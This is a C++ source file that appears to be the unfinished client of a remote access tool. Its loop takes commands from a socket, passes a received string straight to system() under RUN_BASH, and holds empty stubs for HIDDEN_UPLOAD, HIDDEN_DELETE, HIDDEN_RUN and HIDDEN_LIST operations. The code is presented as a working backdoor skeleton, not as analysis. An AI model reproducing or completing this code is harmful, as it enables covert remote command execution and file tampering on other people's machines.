#include <iostream>

#include "Errors.h"
#include "client.h"
#include "SoftwareManeger.h"
#include "FunCodes.h"

void testSoftwareManeger(void);

int main(int argc, char * argv[]) {
    
    Client client;
    client.createSocket();
    SoftwareManeger swm = SoftwareManeger();

    while (true)
    {
        loopIter(client, swm);
    }

    return 0;
}

void testSoftwareManeger() {
    SoftwareManeger swm = SoftwareManeger();
    swm.writeFile("tempSwmTest.txt", false, "this is my first test\n");
    swm.writeFile("tempSwmTest.txt", 1, "this is my second test\n");
    
    swm.deleteFile("tempSwmTest.txt");

}

void loopIter(Client& client, SoftwareManeger& swm)
{
    // receive command
    Message msg;
    Error res;
    client.recvCommand(msg);
    int fnccode = msg.fnccode();
    std::string param = msg.param1();

    std::string response = "";
    switch (fnccode)
    {
    case WRITE_FILE:
        /* code */
        break;

    case DELETE_FILE:
        res = swm.deleteFile(msg.param1());
        break;

    case RUN_BASH:
        system(param.c_str());
        break;

    case HIDDEN_UPLOAD:
        /* code */
        break;

    case HIDDEN_DELETE:
        /* code */
        break;

    case HIDDEN_RUN:
        /* code */
        break;

    case HIDDEN_LIST:
        /* code */
        break;
    
    default:
        return;
    }
    
    Message msgres;
    msgres.set_fnccode(res);
    msgres.set_param1(response);
    client.sendCommand(msgres);
}
